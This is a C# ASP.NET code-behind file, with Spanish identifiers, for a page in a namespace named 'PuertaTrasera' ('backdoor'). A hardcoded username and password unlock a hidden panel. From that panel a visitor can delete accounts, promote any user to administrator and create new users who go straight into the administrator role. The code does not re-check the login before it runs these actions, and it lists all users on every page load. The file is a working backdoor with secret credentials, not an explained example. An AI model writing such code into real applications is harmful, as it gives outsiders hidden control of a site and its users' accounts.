using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data;
using System.Web.Security;

namespace AplicacionWeb.PuertaTrasera
{
    public partial class AdministrarUsuarios : System.Web.UI.Page
    {

        #region Eventos

        protected void Page_Load(object sender, EventArgs e)
        {

            if (!this.IsPostBack)
            {

                divContenidoSecreto.Visible = false;

                this.Form.DefaultButton = btnIniciarSesion.UniqueID;
                
            }

            CargarUsuarios();

        }

        protected void btnEliminar_Click(object sender, EventArgs e)
        {

            if (gvUsuarios.SelectedIndex >= 0)
            {

                string nombre = gvUsuarios.Rows[gvUsuarios.SelectedIndex].Cells[1].Text;

                EliminarUsuario(nombre);

                CargarUsuarios();

            }

        }
        
        protected void CreateUserWizard_CreatedUser(object sender, EventArgs e)
        {

            string nombre = CreateUserWizard.UserName;

            string rol = "Administradores";

            AgregarUsuarioARol(nombre, rol);

            CargarUsuarios();

        }
        
        protected void btnCambiarAAdministrador_Click(object sender, EventArgs e)
        {

            if (gvUsuarios.SelectedIndex >= 0)
            {

                string nombre = gvUsuarios.Rows[gvUsuarios.SelectedIndex].Cells[1].Text;

                string rol = "Administradores";

                AgregarUsuarioARol(nombre, rol);

            }

        }

        protected void btnIniciarSesion_Click(object sender, EventArgs e)
        {

            string usuario = txtUsuario.Text;

            string contraseña = txtContraseña.Text;

            ValidarSesionCorrecta(usuario, contraseña);

        }

        protected void CreateUserWizard_ContinueButtonClick(object sender, EventArgs e)
        {

            CargarUsuarios();

        }

        protected void btnCambiarAMiembro_Click(object sender, EventArgs e)
        {

            if (gvUsuarios.SelectedIndex >= 0)
            {

                string nombre = gvUsuarios.Rows[gvUsuarios.SelectedIndex].Cells[1].Text;

                string rol = "Miembros";

                AgregarUsuarioARol(nombre, rol);

            }

        }

        #endregion

        #region Metodos Privados

        private void EliminarUsuario(string nombre)
        {

            if (!string.IsNullOrEmpty(nombre))
            {

                Membership.DeleteUser(nombre, true);

            }

        }

        private void AgregarUsuarioARol(string nombre, string rol)
        {

            if (!Roles.IsUserInRole(nombre, rol))
            {

                Roles.AddUserToRole(nombre, rol);

            }

        }

        private void CargarUsuarios()
        {

            gvUsuarios.DataSource = Membership.GetAllUsers();

            gvUsuarios.DataBind();

        }

        private void ValidarSesionCorrecta(string usuario, string contraseña)
        {

            if (usuario == "@ndrew" && contraseña == "@ndrewMonkey")
            {

                divIniciarSesionEstatico.Visible = false;

                divContenidoSecreto.Visible = true;
            
            }

        }
        
        #endregion
        
    }
}